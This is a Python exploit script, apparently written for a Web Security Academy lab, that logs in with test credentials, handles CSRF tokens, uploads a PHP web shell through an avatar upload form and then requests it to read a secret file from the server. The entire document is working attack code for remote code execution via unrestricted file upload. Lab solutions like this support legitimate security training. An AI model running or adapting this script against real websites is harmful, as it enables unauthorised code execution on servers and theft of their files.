#!/usr/bin/python3

# Attack Flow
# 1) Login with test accounts to retrieve the session token
# 2) Upload a payload using Avatar upload functionality
# 3) Read the uploaded payload to gain RCE

import requests
import sys
from bs4 import BeautifulSoup

def getCSRF(s, url, endpoint): 

    # Getting CSRF Token
    r = s.get(url + endpoint)
    p = BeautifulSoup(r.content, "lxml")

    csrf = p.find(attrs = {'name' : 'csrf'})['value']
    print(f"[INFO] Getting CSRF Token: {csrf}")

    return csrf

# def cmd()

def fileUpload(url, username, password, filename, endpoint_login, endpoint_myaccount, endpoint_upload, endpoint_files):

    # Getting CSRF Token
    s = requests.Session()

    csrf = getCSRF(s, url, endpoint_login)

    data = {
        "csrf" : csrf,
        "username": username,
        "password": password,
    }

    r = s.post(url + endpoint_login, data=data)

    if r.status_code == 200:
        print("[INFO] Login successful!")

        csrf = getCSRF(s, url, endpoint_myaccount)

        data = {
            "csrf": csrf,
            "user": username,
        }

        files = {
            "avatar": (filename, open("rce.php", "rb"), "application/x-php"),
        }

        r = s.post(url + endpoint_upload, files=files, data=data)
        #print(r.text)
        #print(r.status_code)

        if r.status_code == 200:
            print("[INFO] Payload upload successful!")

            r = s.get(url + endpoint_files + "/" + filename)
            print("[INFO] Secret: " + r.text)

        else: 
            print("[INFO] Something went wrong!")
            sys.exit(1)

    else: 
        print("[INFO] Something went wrong!")
        sys.exit(1)

def createPayload():
    # Creating a PHP RCE payload
    f = open("rce.php", "w")    # "w" to overwrite the existing file
    f.write("""<?php echo file_get_contents('/home/carlos/secret'); ?>""")
    f.close()

if __name__ == '__main__':
    url = "https://ac8f1f441e934959c0ce7b80002000e8.web-security-academy.net"
    endpoint_login = "/login"
    endpoint_myaccount = "/my-account"
    endpoint_upload = "/my-account/avatar"
    endpoint_files = "/files/avatars"

    username = "wiener"
    password = "peter"
    filename = "bigb0ss.php"

    createPayload()
    fileUpload(url, username, password, filename, endpoint_login, endpoint_myaccount, endpoint_upload, endpoint_files)


